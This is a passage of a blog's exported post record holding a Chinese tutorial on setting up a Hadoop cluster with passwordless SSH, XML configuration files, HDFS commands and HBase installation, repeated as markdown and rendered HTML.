rsa\n```\n**一直敲回车(如果之前进行过这种操作，会提示是否覆盖之前的内容，输入y回车)，进行完这一步后系统会在`~/.ssh/`目录下生成两个文件，一个是私钥，一个是公钥，需要把公钥放在联机主机上**\n```\nssh-copy-id -p port username@remote-server\n```\n\n**登录测试一下，通常第一次登录需要密码，之后不需要，如果碰到**\n```\nconnect to host localhost port 22: connection refused\n```\n\n**有两种可能，一种是你的ssh服务没有打开通过一下命令打开**\n```\nsudo service sshd restart\n```\n\n**另一种可能是你的ssh—agent和ssh-server等设置不一致，需要将`/etc/ssh/ssh_config`和`/etc/ssh/sshd_config`两个文件里面的端口设置相同**\n\n**如果需要这种情况**\n```\nsign_and_send_pubkey: signing failed: agent refused operation\n```\n\n**需要敲`ssh-add`就解决问题**\n\n### 联机\n**联机设置主要在`hadoop/etc/hadoop/masters`和`hadoop/etc/hadoop/slaves`里面,在所有机子上设置`masters`为主机ip地址,而只在主机上添加其他所有联机设备的ip地址(2.x版本不需要masters文件，因此不必配置masters文件)**\n> 说明：slaves里面同样可以写主机hostname，如果写hostname, 需要配合`/etc/hosts`一起配置\n\n![masters and slaves](/images/hadoop-master-slaves-conf.png)\n\n**然后在主机上启动hadoop,并通过`localhost:50070`查看Hadoop信息和连接情况**\n\n**如果在网页上没有出现我们的datanode，可能是需要进入没有出现的slaves，找到之前`hdfs.site.xml`配置的目录，将其目录下的所有文件删掉就ok**\n\n## Hadoop下载安装\n\n### 进入`Hadoop`官网找到最新的稳定版下载\n![下载界面](/images/hadoopdownloads.png)\n\n**下载完成后将压缩包解压并重命名为`hadoop`(为了方便)**\n\n### 配置\n**编辑`hadoop/etc/hadoop/core-site.xml`,指定NameNode的主机名和端口**\n``` xml\n<configuration>\n\t<property>\n\t\t<name>fs.defaultFS</name>\n\t\t<value>hdfs://hadoop-master:9000</value>\n\t</property>\n\t<property>\n\t\t<name>io.file.buffer.size</name>\n\t\t<value>131072</value>\n\t</property>\n\t<property>\n\t\t<name>hadoop.tmp.dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/tmp</value>\n\t</property>\n</configuration>\n```\n\n> 需要说明属性`hadoop.tmp.dir`的值是一个你电脑上的目录，为了方便，最好将它设置在`hadoop`目录下。而`fs.defaultFS`的值是主机+端口,`hadoop-master`可以在`/etc/hosts`里面设置，一般本机设置默认为`localhost`，`fs.default.name`的值统一为`masters`下的主机名称.\n\n**编辑`hadoop/etc/hadoop/hdfs-site.xml`,指定HDFS的默认副本数**\n``` xml\n<configuration>\n\t<property>\n\t\t<name>dfs.namenode.name.dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/hdfs/namenode</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.datanode.data.dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/hdfs/datanode</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.namenode.checkpoint.dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/hdfs/namesecondary</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.replication</name>\n\t\t<value>2</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.block.size</name>\n\t\t<value>134217728</value>\n\t</property>\n</configuration>\n```\n\n**编辑`hadoop/etc/hadoop/mapred-site.xml`,指定JobTracker的主机名和端口(如果没有，直接复制`mapred-site.xml.template`)**\n``` xml\n<configuration>\n\t<property>\n\t\t<name>mapreduce.framework.name</name>\n\t\t<value>yarn</value>\n\t</property>\n\t<property>\n\t\t<name>mapreduce.jobhistory.address</name>\n\t\t<value>hadoop-master:10020</value>\n\t</property>\n\t<property>\n\t\t<name>mapreduce.jobhistory.webapp.address</name>\n\t\t<value>hadoop-master:19888</value>\n\t</property>\n\t<!--\n\t<property>\n\t\t<name>yarn.app.mapreduce.am.staging-dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/app</value>\n\t</property>\n\t-->\n</configuration>\n```\n\n**编辑`hadoop/etc/hadoop/yarn-site.xml`**\n``` xml\n<configuration>\n\n<!-- Site specific YARN configuration properties -->\n\t<property>\n\t\t<name>yarn.resourcemanager.hostname</name>\n\t\t<value>hadoop-master</value>\n\t</property>\n    <!--\n\t<property>\n\t\t<name>yarn.resourcemanager.bind-host</name>\n\t\t<value>0.0.0.0</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.nodemanager.bind-host</name>\n\t\t<value>0.0.0.0</value>\n\t</property>\n    -->\n\t<property>\n\t\t<name>yarn.nodemanager.aux-services</name>\n\t\t<value>mapreduce_shuffle</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.nodemanager.aux-services.mapreduce_shuffle.class</name>\n\t\t<value>org.apache.hadoop.mapred.ShuffleHandler</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.log-aggregation-enable</name>\n\t\t<value>true</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.nodemanager.local-dirs</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/yarn/local</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.nodemanager.log-dirs</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/yarn/log</value>\n\t</property>\n\t<!--\n\t<property>\n\t\t<name>yarn.nodemanager.remote-app-log-dir</name>\n\t\t<value>hdfs://hadoop-master:9000/home/fenlan/Downloads/hadoop/yarn-log/apps</value>\n\t</property>\n\t-->\n</configuration>\n\n```\n\n**修改`hadoop/etc/hadoop/hadoop-env.sh`,将里面的JAVA_HOME设置为JAVA安装根目录**\n``` shell\nexport HAVA_HOME＝/home/fenlan/Downloads/jdk1.8.0_60\n```\n> 想知道本机JAVA_HOME，敲个`which java`就知道了\n\n**编辑`hadoop/etc/hadoop/master`,添加namenode主机,`hadoop/etc/hadoop/slaves`,添加datanode主机**\n```\nhadoop-master\n```\n```\nhadoop-slave1\nhadoop-slave2\n```\n\n> 需要说明，hadoop-slave hadoop-master为主机的hostname, 为了方便管理，需要将主机的hostname修改, 比如我的电脑开始hostname是`fenlan-K401UQ`, 在我的教程里面就需要改成`hadoop-slave1`(相当重要，否则在运行程序是会报错找不到主机),这里我个人感激仍然没有讲清楚，下面有一个youtube视频教程，辅助理解\n\n**格式化HDFS**\n``` shell\nbin/hdfs namenode -format\n```\n\n**启动Hadoop的单节点集群**\n``` shell\nsbin/start-dfs.sh\nsbin/start-yarn.sh\nsbin/mr-jobhistory-daemon.sh start historyserver\nsbin/start-all.sh\n```\n\n**停止Hadoop**\n``` shell\nsbin/stop-dfs.sh\nsbin/stop-yarn.sh\nsbin/mr-jobhistory-daemon.sh stop historyserver\nsbin/stop-all.sh\n```\n\n### 加载HDFS\n```\nbin/hadoop fs -mkdir /fenlan/input\nbin/hadoop fs -mkdir /fenlan/output\nbin/hadoop fs -put files /fenlan/input\n```\n\n**运行一个单词统计实例**\n```\nbin/hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-2.8.1.jar wordcount /fenlan/input /fenlan/output/result\n```\n\n**查看结果**\n```\nbin/hadoop fs -cat /fenlan/output/result/*\n```\n\n## 推荐教程\n[hadoop搭建教程](https://dwbi.org/etl/bigdata/183-setup-hadoop-cluster)\n[hadoop分布式集群搭建](http://www.ityouknow.com/hadoop/2017/07/24/hadoop-cluster-setup.html)\n[视频教程(youtube)](https://www.youtube.com/watch?v=-YEcJquYsFo)\n\n## HBase 安装\n1. 官网下载HBase,解压包并重命名为`hbase`\n2. 编辑`hbase/conf/hbase-env.sh`的`JAVA_HOME`\n3. 编辑`hbase/conf/hbase-site.xml`如下\n``` xml\n<configuration>\n\t<property>\n\t\t<name>hbase.rootdir</name>\n\t\t<value>hdfs://hadoop-master:9000/hbase</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.cluster.distributed</name>\n\t\t<value>true</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.master</name>\n\t\t<value>hadoop-master:60000</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.zookeeper.quorum</name>\n\t\t<value>hadoop-master,hadoop-slave1,hadoop-slave2</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.master.info.port</name>\n\t\t<value>60010</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.master.port</name>\n\t\t<value>60000</value>\n\t</property>\n</configuration>\n```\n\n4. 编辑`hbase/conf/regionservers`添加slaves主机\n5. 启动HBase(先启动hadoop)\n```\nbin/start-hbase.sh\n```\n\n6. 管理HBase\n```\nbin/hbase shell\n```\n\n## 问题总结\n**1.当无法启动datanode时将`hadoop/hdfs/datanode/current/`文件夹删掉重新启动**\n\n**教程如果有错误，欢迎留言!**","source":"_posts/hadoop.md","raw":"---\ntitle: hadoop之旅\ndate: 2017-09-22 15:18:23\ncategories: 分布式计算\ntag:\n  - hadoop\n  - Hbase\n  - Zookeeper\n---\n\n## hadoop介绍\n**以下是 Hadoop 的几种定义，每种定义都针对的是企业内的不同受众：**\n- 对于高管：Hadoop 是 Apache 的一个开源软件项目，目的是从令人难以置信的数量/速度/多样性等有关组织的数据中获取价值。使用数据，而不是扔掉大部分数据。\n- 对于技术管理人员：一个开源软件套件，挖掘有关您的企业的结构化和非结构化大数据。Hadoop 集成您现有的商业智能生态系统。\n- 工程：大规模并行、无共享、基于 Java 的 map-reduce 执行环境。打算使用数百台到数千台计算机处理相同的问题，具有内置的故障恢复能力。Hadoop 生态系统中的项目提供了数据加载、更高层次的语言、自动化的云部署，以及其他功能。\n- 安全性：由 Kerberos 保护的软件套件。\n\n<!-- more -->\n\n## hadoop组件\n**下图显示了Hadoop生态系统各种组件**\n![Hadoop](http://cdn.guru99.com/images/Big_Data/061114_0803_LearnHadoop4.png)\n\n**Apache Hadoop 由两个子项目组成**\n1. Hadoop MapReduce : MapReduce 是一种计算模型及软件架构，编写在Hadoop上运行的应用程序。这些MapReduce程序能够对大型集群计算节点并行处理大量的数据。\n2. HDFS (Hadoop Distributed File System): HDFS 处理 Hadoop 应用程序的存储部分。 MapReduce应用使用来自HDFS的数据。 HDFS创建数据块的多个副本，并集群分发它们到计算节点。这种分配使得应用可靠和极其迅速的计算。\n\n**如果还是不清楚，再解释一下**\n- HDFS：如果您希望有 4000 多台电脑处理您的数据，那么最好将您的数据分发给 4000 多台电脑。HDFS 可以帮助您做到这一点。HDFS 有几个可以移动的部件。Datanodes 存储数据，Namenode 跟踪存储的位置。还有其他部件，但这些已经足以使您开始了。\n- MapReduce：这是一个面向 Hadoop 的编程模型。有两个阶段，毫不意外，它们分别被称为 Map 和 Reduce。如果希望给您的朋友留下深刻的印象，那么告诉他们，Map 和 Reduce 阶段之间有一个随机排序。JobTracker 管理您的 MapReduce 作业的 4000 多个组件。TaskTracker 从 JobTracker 接受订单。如果您喜欢 Java，那么用 Java 编写代码。如果您喜欢 SQL 或 Java 以外的其他语言，您的运气仍然不错，您可以使用一个名为 Hadoop Streaming 的实用程序。\n\n**需要根本性理解这两个东西，否则配置的时候跟着教程走会遇到问题**\n**附上[参考地址1](https://wizardforcel.gitbooks.io/tutorialspoint-db/hadoop/39.html) [参考地址2](https://www.ibm.com/developerworks/cn/data/library/techarticle/dm-1209hadoopbigdata/index.html)**\n\n## 说说联机\n\n### 首先准备ssh\n**为了使用Hadoop的时候免于密码登录其他Slaves，需要对ssh进行设置。**\n**生成登录钥匙,分为公钥和私钥**\n```\nssh-keygen -t rsa\n```\n**一直敲回车(如果之前进行过这种操作，会提示是否覆盖之前的内容，输入y回车)，进行完这一步后系统会在`~/.ssh/`目录下生成两个文件，一个是私钥，一个是公钥，需要把公钥放在联机主机上**\n```\nssh-copy-id -p port username@remote-server\n```\n\n**登录测试一下，通常第一次登录需要密码，之后不需要，如果碰到**\n```\nconnect to host localhost port 22: connection refused\n```\n\n**有两种可能，一种是你的ssh服务没有打开通过一下命令打开**\n```\nsudo service sshd restart\n```\n\n**另一种可能是你的ssh—agent和ssh-server等设置不一致，需要将`/etc/ssh/ssh_config`和`/etc/ssh/sshd_config`两个文件里面的端口设置相同**\n\n**如果需要这种情况**\n```\nsign_and_send_pubkey: signing failed: agent refused operation\n```\n\n**需要敲`ssh-add`就解决问题**\n\n### 联机\n**联机设置主要在`hadoop/etc/hadoop/masters`和`hadoop/etc/hadoop/slaves`里面,在所有机子上设置`masters`为主机ip地址,而只在主机上添加其他所有联机设备的ip地址(2.x版本不需要masters文件，因此不必配置masters文件)**\n> 说明：slaves里面同样可以写主机hostname，如果写hostname, 需要配合`/etc/hosts`一起配置\n\n![masters and slaves](/images/hadoop-master-slaves-conf.png)\n\n**然后在主机上启动hadoop,并通过`localhost:50070`查看Hadoop信息和连接情况**\n\n**如果在网页上没有出现我们的datanode，可能是需要进入没有出现的slaves，找到之前`hdfs.site.xml`配置的目录，将其目录下的所有文件删掉就ok**\n\n## Hadoop下载安装\n\n### 进入`Hadoop`官网找到最新的稳定版下载\n![下载界面](/images/hadoopdownloads.png)\n\n**下载完成后将压缩包解压并重命名为`hadoop`(为了方便)**\n\n### 配置\n**编辑`hadoop/etc/hadoop/core-site.xml`,指定NameNode的主机名和端口**\n``` xml\n<configuration>\n\t<property>\n\t\t<name>fs.defaultFS</name>\n\t\t<value>hdfs://hadoop-master:9000</value>\n\t</property>\n\t<property>\n\t\t<name>io.file.buffer.size</name>\n\t\t<value>131072</value>\n\t</property>\n\t<property>\n\t\t<name>hadoop.tmp.dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/tmp</value>\n\t</property>\n</configuration>\n```\n\n> 需要说明属性`hadoop.tmp.dir`的值是一个你电脑上的目录，为了方便，最好将它设置在`hadoop`目录下。而`fs.defaultFS`的值是主机+端口,`hadoop-master`可以在`/etc/hosts`里面设置，一般本机设置默认为`localhost`，`fs.default.name`的值统一为`masters`下的主机名称.\n\n**编辑`hadoop/etc/hadoop/hdfs-site.xml`,指定HDFS的默认副本数**\n``` xml\n<configuration>\n\t<property>\n\t\t<name>dfs.namenode.name.dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/hdfs/namenode</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.datanode.data.dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/hdfs/datanode</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.namenode.checkpoint.dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/hdfs/namesecondary</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.replication</name>\n\t\t<value>2</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.block.size</name>\n\t\t<value>134217728</value>\n\t</property>\n</configuration>\n```\n\n**编辑`hadoop/etc/hadoop/mapred-site.xml`,指定JobTracker的主机名和端口(如果没有，直接复制`mapred-site.xml.template`)**\n``` xml\n<configuration>\n\t<property>\n\t\t<name>mapreduce.framework.name</name>\n\t\t<value>yarn</value>\n\t</property>\n\t<property>\n\t\t<name>mapreduce.jobhistory.address</name>\n\t\t<value>hadoop-master:10020</value>\n\t</property>\n\t<property>\n\t\t<name>mapreduce.jobhistory.webapp.address</name>\n\t\t<value>hadoop-master:19888</value>\n\t</property>\n\t<!--\n\t<property>\n\t\t<name>yarn.app.mapreduce.am.staging-dir</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/app</value>\n\t</property>\n\t-->\n</configuration>\n```\n\n**编辑`hadoop/etc/hadoop/yarn-site.xml`**\n``` xml\n<configuration>\n\n<!-- Site specific YARN configuration properties -->\n\t<property>\n\t\t<name>yarn.resourcemanager.hostname</name>\n\t\t<value>hadoop-master</value>\n\t</property>\n    <!--\n\t<property>\n\t\t<name>yarn.resourcemanager.bind-host</name>\n\t\t<value>0.0.0.0</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.nodemanager.bind-host</name>\n\t\t<value>0.0.0.0</value>\n\t</property>\n    -->\n\t<property>\n\t\t<name>yarn.nodemanager.aux-services</name>\n\t\t<value>mapreduce_shuffle</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.nodemanager.aux-services.mapreduce_shuffle.class</name>\n\t\t<value>org.apache.hadoop.mapred.ShuffleHandler</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.log-aggregation-enable</name>\n\t\t<value>true</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.nodemanager.local-dirs</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/yarn/local</value>\n\t</property>\n\t<property>\n\t\t<name>yarn.nodemanager.log-dirs</name>\n\t\t<value>file:/home/fenlan/Downloads/hadoop/yarn/log</value>\n\t</property>\n\t<!--\n\t<property>\n\t\t<name>yarn.nodemanager.remote-app-log-dir</name>\n\t\t<value>hdfs://hadoop-master:9000/home/fenlan/Downloads/hadoop/yarn-log/apps</value>\n\t</property>\n\t-->\n</configuration>\n\n```\n\n**修改`hadoop/etc/hadoop/hadoop-env.sh`,将里面的JAVA_HOME设置为JAVA安装根目录**\n``` shell\nexport HAVA_HOME＝/home/fenlan/Downloads/jdk1.8.0_60\n```\n> 想知道本机JAVA_HOME，敲个`which java`就知道了\n\n**编辑`hadoop/etc/hadoop/master`,添加namenode主机,`hadoop/etc/hadoop/slaves`,添加datanode主机**\n```\nhadoop-master\n```\n```\nhadoop-slave1\nhadoop-slave2\n```\n\n> 需要说明，hadoop-slave hadoop-master为主机的hostname, 为了方便管理，需要将主机的hostname修改, 比如我的电脑开始hostname是`fenlan-K401UQ`, 在我的教程里面就需要改成`hadoop-slave1`(相当重要，否则在运行程序是会报错找不到主机),这里我个人感激仍然没有讲清楚，下面有一个youtube视频教程，辅助理解\n\n**格式化HDFS**\n``` shell\nbin/hdfs namenode -format\n```\n\n**启动Hadoop的单节点集群**\n``` shell\nsbin/start-dfs.sh\nsbin/start-yarn.sh\nsbin/mr-jobhistory-daemon.sh start historyserver\nsbin/start-all.sh\n```\n\n**停止Hadoop**\n``` shell\nsbin/stop-dfs.sh\nsbin/stop-yarn.sh\nsbin/mr-jobhistory-daemon.sh stop historyserver\nsbin/stop-all.sh\n```\n\n### 加载HDFS\n```\nbin/hadoop fs -mkdir /fenlan/input\nbin/hadoop fs -mkdir /fenlan/output\nbin/hadoop fs -put files /fenlan/input\n```\n\n**运行一个单词统计实例**\n```\nbin/hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-2.8.1.jar wordcount /fenlan/input /fenlan/output/result\n```\n\n**查看结果**\n```\nbin/hadoop fs -cat /fenlan/output/result/*\n```\n\n## 推荐教程\n[hadoop搭建教程](https://dwbi.org/etl/bigdata/183-setup-hadoop-cluster)\n[hadoop分布式集群搭建](http://www.ityouknow.com/hadoop/2017/07/24/hadoop-cluster-setup.html)\n[视频教程(youtube)](https://www.youtube.com/watch?v=-YEcJquYsFo)\n\n## HBase 安装\n1. 官网下载HBase,解压包并重命名为`hbase`\n2. 编辑`hbase/conf/hbase-env.sh`的`JAVA_HOME`\n3. 编辑`hbase/conf/hbase-site.xml`如下\n``` xml\n<configuration>\n\t<property>\n\t\t<name>hbase.rootdir</name>\n\t\t<value>hdfs://hadoop-master:9000/hbase</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.cluster.distributed</name>\n\t\t<value>true</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.master</name>\n\t\t<value>hadoop-master:60000</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.zookeeper.quorum</name>\n\t\t<value>hadoop-master,hadoop-slave1,hadoop-slave2</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.master.info.port</name>\n\t\t<value>60010</value>\n\t</property>\n\t<property>\n\t\t<name>hbase.master.port</name>\n\t\t<value>60000</value>\n\t</property>\n</configuration>\n```\n\n4. 编辑`hbase/conf/regionservers`添加slaves主机\n5. 启动HBase(先启动hadoop)\n```\nbin/start-hbase.sh\n```\n\n6. 管理HBase\n```\nbin/hbase shell\n```\n\n## 问题总结\n**1.当无法启动datanode时将`hadoop/hdfs/datanode/current/`文件夹删掉重新启动**\n\n**教程如果有错误，欢迎留言!**","slug":"hadoop","published":1,"updated":"2017-11-30T11:31:47.847Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscz50025yp0ljkznnbh2","content":"<h2 id=\"hadoop介绍\"><a href=\"#hadoop介绍\" class=\"headerlink\" title=\"hadoop介绍\"></a>hadoop介绍</h2><p><strong>以下是 Hadoop 的几种定义，每种定义都针对的是企业内的不同受众：</strong></p>\n<ul>\n<li>对于高管：Hadoop 是 Apache 的一个开源软件项目，目的是从令人难以置信的数量/速度/多样性等有关组织的数据中获取价值。使用数据，而不是扔掉大部分数据。</li>\n<li>对于技术管理人员：一个开源软件套件，挖掘有关您的企业的结构化和非结构化大数据。Hadoop 集成您现有的商业智能生态系统。</li>\n<li>工程：大规模并行、无共享、基于 Java 的 map-reduce 执行环境。打算使用数百台到数千台计算机处理相同的问题，具有内置的故障恢复能力。Hadoop 生态系统中的项目提供了数据加载、更高层次的语言、自动化的云部署，以及其他功能。</li>\n<li>安全性：由 Kerberos 保护的软件套件。</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"hadoop组件\"><a href=\"#hadoop组件\" class=\"headerlink\" title=\"hadoop组件\"></a>hadoop组件</h2><p><strong>下图显示了Hadoop生态系统各种组件</strong><br><img src=\"http://cdn.guru99.com/images/Big_Data/061114_0803_LearnHadoop4.png\" alt=\"Hadoop\"></p>\n<p><strong>Apache Hadoop 由两个子项目组成</strong></p>\n<ol>\n<li>Hadoop MapReduce : MapReduce 是一种计算模型及软件架构，编写在Hadoop上运行的应用程序。这些MapReduce程序能够对大型集群计算节点并行处理大量的数据。</li>\n<li>HDFS (Hadoop Distributed File System): HDFS 处理 Hadoop 应用程序的存储部分。 MapReduce应用使用来自HDFS的数据。 HDFS创建数据块的多个副本，并集群分发它们到计算节点。这种分配使得应用可靠和极其迅速的计算。</li>\n</ol>\n<p><strong>如果还是不清楚，再解释一下</strong></p>\n<ul>\n<li>HDFS：如果您希望有 4000 多台电脑处理您的数据，那么最好将您的数据分发给 4000 多台电脑。HDFS 可以帮助您做到这一点。HDFS 有几个可以移动的部件。Datanodes 存储数据，Namenode 跟踪存储的位置。还有其他部件，但这些已经足以使您开始了。</li>\n<li>MapReduce：这是一个面向 Hadoop 的编程模型。有两个阶段，毫不意外，它们分别被称为 Map 和 Reduce。如果希望给您的朋友留下深刻的印象，那么告诉他们，Map 和 Reduce 阶段之间有一个随机排序。JobTracker 管理您的 MapReduce 作业的 4000 多个组件。TaskTracker 从 JobTracker 接受订单。如果您喜欢 Java，那么用 Java 编写代码。如果您喜欢 SQL 或 Java 以外的其他语言，您的运气仍然不错，您可以使用一个名为 Hadoop Streaming 的实用程序。</li>\n</ul>\n<p><strong>需要根本性理解这两个东西，否则配置的时候跟着教程走会遇到问题</strong><br><strong>附上<a href=\"https://wizardforcel.gitbooks.io/tutorialspoint-db/hadoop/39.html\" target=\"_blank\" rel=\"external\">参考地址1</a> <a href=\"https://www.ibm.com/developerworks/cn/data/library/techarticle/dm-1209hadoopbigdata/index.html\" target=\"_blank\" rel=\"external\">参考地址2</a></strong></p>\n<h2 id=\"说说联机\"><a href=\"#说说联机\" class=\"headerlink\" title=\"说说联机\"></a>说说联机</h2><h3 id=\"首先准备ssh\"><a href=\"#首先准备ssh\" class=\"headerlink\" title=\"首先准备ssh\"></a>首先准备ssh</h3><p><strong>为了使用Hadoop的时候免于密码登录其他Slaves，需要对ssh进行设置。</strong><br><strong>生成登录钥匙,分为公钥和私钥</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p>\n<p><strong>一直敲回车(如果之前进行过这种操作，会提示是否覆盖之前的内容，输入y回车)，进行完这一步后系统会在<code>~/.ssh/</code>目录下生成两个文件，一个是私钥，一个是公钥，需要把公钥放在联机主机上</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-copy-id -p port username@remote-server</span><br></pre></td></tr></table></figure></p>\n<p><strong>登录测试一下，通常第一次登录需要密码，之后不需要，如果碰到</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">connect to host localhost port 22: connection refused</span><br></pre></td></tr></table></figure></p>\n<p><strong>有两种可能，一种是你的ssh服务没有打开通过一下命令打开</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service sshd restart</span><br></pre></td></tr></table></figure></p>\n<p><strong>另一种可能是你的ssh—agent和ssh-server等设置不一致，需要将<code>/etc/ssh/ssh_config</code>和<code>/etc/ssh/sshd_config</code>两个文件里面的端口设置相同</strong></p>\n<p><strong>如果需要这种情况</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sign_and_send_pubkey: signing failed: agent refused operation</span><br></pre></td></tr></table></figure></p>\n<p><strong>需要敲<code>ssh-add</code>就解决问题</strong></p>\n<h3 id=\"联机\"><a href=\"#联机\" class=\"headerlink\" title=\"联机\"></a>联机</h3><p><strong>联机设置主要在<code>hadoop/etc/hadoop/masters</code>和<code>hadoop/etc/hadoop/slaves</code>里面,在所有机子上设置<code>masters</code>为主机ip地址,而只在主机上添加其他所有联机设备的ip地址(2.x版本不需要masters文件，因此不必配置masters文件)</strong></p>\n<blockquote>\n<p>说明：slaves里面同样可以写主机hostname，如果写hostname, 需要配合<code>/etc/hosts</code>一起配置</p>\n</blockquote>\n<p><img src=\"/images/hadoop-master-slaves-conf.png\" alt=\"masters and slaves\"></p>\n<p><strong>然后在主机上启动hadoop,并通过<code>localhost:50070</code>查看Hadoop信息和连接情况</strong></p>\n<p><strong>如果在网页上没有出现我们的datanode，可能是需要进入没有出现的slaves，找到之前<code>hdfs.site.xml</code>配置的目录，将其目录下的所有文件删掉就ok</strong></p>\n<h2 id=\"Hadoop下载安装\"><a href=\"#Hadoop下载安装\" class=\"headerlink\" title=\"Hadoop下载安装\"></a>Hadoop下载安装</h2><h3 id=\"进入Hadoop官网找到最新的稳定版下载\"><a href=\"#进入Hadoop官网找到最新的稳定版下载\" class=\"headerlink\" title=\"进入Hadoop官网找到最新的稳定版下载\"></a>进入<code>Hadoop</code>官网找到最新的稳定版下载</h3><p><img src=\"/images/hadoopdownloads.png\" alt=\"下载界面\"></p>\n<p><strong>下载完成后将压缩包解压并重命名为<code>hadoop</code>(为了方便)</strong></p>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><p><strong>编辑<code>hadoop/etc/hadoop/core-site.xml</code>,指定NameNode的主机名和端口</strong><br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>fs.defaultFS<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hdfs://hadoop-master:9000<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>io.file.buffer.size<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>131072<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hadoop.tmp.dir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/tmp<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>需要说明属性<code>hadoop.tmp.dir</code>的值是一个你电脑上的目录，为了方便，最好将它设置在<code>hadoop</code>目录下。而<code>fs.defaultFS</code>的值是主机+端口,<code>hadoop-master</code>可以在<code>/etc/hosts</code>里面设置，一般本机设置默认为<code>localhost</code>，<code>fs.default.name</code>的值统一为<code>masters</code>下的主机名称.</p>\n</blockquote>\n<p><strong>编辑<code>hadoop/etc/hadoop/hdfs-site.xml</code>,指定HDFS的默认副本数</strong><br><figure class=\"highlight xml\"><table><tr><td 